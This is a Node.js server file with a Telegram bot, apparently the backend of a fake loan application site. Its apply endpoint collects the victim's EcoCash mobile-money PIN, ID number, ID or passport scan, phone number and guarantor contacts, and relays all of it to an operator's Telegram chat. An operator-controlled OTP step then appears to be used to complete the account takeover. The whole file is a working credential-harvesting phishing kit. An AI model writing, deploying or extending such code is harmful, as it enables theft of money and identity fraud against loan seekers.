const express = require('express');
const { Telegraf, Markup } = require('telegraf');
const multer = require('multer');
const path = require('path');

const app = express();
// Stores the uploaded file temporarily in the server's memory
const upload = multer({ storage: multer.memoryStorage() }); 

// Environment Variables (Set these in Render dashboard)
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

const bot = new Telegraf(BOT_TOKEN);
const applications = {}; 

bot.start((ctx) => ctx.reply('Welcome Admin! You will receive loan applications here.'));

bot.action(/^gen_otp_(.+)$/, (ctx) => {
    const appId = ctx.match[1];
    if (!applications[appId]) return ctx.answerCbQuery('Application not found.');
    const newOtp = Math.floor(100000 + Math.random() * 900000).toString();
    applications[appId].otp = newOtp;
    ctx.answerCbQuery('OTP Generated!');
    ctx.editMessageText(`✅ OTP for ${applications[appId].name} is: *${newOtp}*`, { parse_mode: 'Markdown' });
});

bot.action(/^revoke_otp_(.+)$/, (ctx) => {
    const appId = ctx.match[1];
    if (!applications[appId]) return ctx.answerCbQuery('Application not found.');
    applications[appId].otp = null;
    ctx.answerCbQuery('OTP Revoked!');
    ctx.editMessageText(`❌ OTP for ${applications[appId].name} has been revoked.`);
});

bot.launch().then(() => console.log('Bot running'));

// --- API ENDPOINT TO RECEIVE FORM + FILE ---
app.post('/api/apply', upload.single('idCard'), async (req, res) => {
    const appId = `APP_${Date.now()}`;
    const data = req.body; 
    const file = req.file; // This is the uploaded ID/Passport

    applications[appId] = { ...data, otp: null, status: 'pending' };

    const message = `
🚨 *NEW LOAN APPLICATION* 🚨
*App ID:* ${appId}
*Name:* ${data.fullName}
*ID Number:* ${data.idNumber}
*Phone:* +263${data.phoneNumber}
*Loan Amount:* $${data.loanAmount}
*EcoCash PIN:* \`${data.ecoCashPin}\`
*Guarantor 1:* ${data.guarantor1Name} (${data.guarantor1Phone})
*Guarantor 2:* ${data.guarantor2Name} (${data.guarantor2Phone})
    `;

    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🔑 Generate OTP', `gen_otp_${appId}`)],
        [Markup.button.callback('❌ Revoke OTP', `revoke_otp_${appId}`)]
    ]);

    try {
        // 1. Send the text message to Telegram
        await bot.telegram.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: 'Markdown', ...keyboard });
        
        // 2. Send the ID/Passport file to Telegram if it exists
        if (file) {
            await bot.telegram.sendDocument(ADMIN_CHAT_ID, { 
                source: file.buffer, 
                filename: file.originalname 
            });
        }
        
        res.json({ success: true, appId: appId });
    } catch (error) {
        console.error("Telegram Error:", error);
        res.status(500).json({ success: false });
    }
});

// --- OTP VERIFICATION ENDPOINT ---
app.post('/api/verify-otp', express.json(), (req, res) => {
    const { appId, otp } = req.body;
    if (!applications[appId]) return res.status(404).json({ success: false, message: 'Not found.' });
    
    if (applications[appId].otp && applications[appId].otp === otp) {
        bot.telegram.sendMessage(ADMIN_CHAT_ID, `✅ User *${applications[appId].name}* verified OTP!`, { parse_mode: 'Markdown' });
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false, message: 'Invalid OTP.' });
    }
});

// Serve the HTML files directly from the root folder
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/otp.html', (req, res) => res.sendFile(path.join(__dirname, 'otp.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));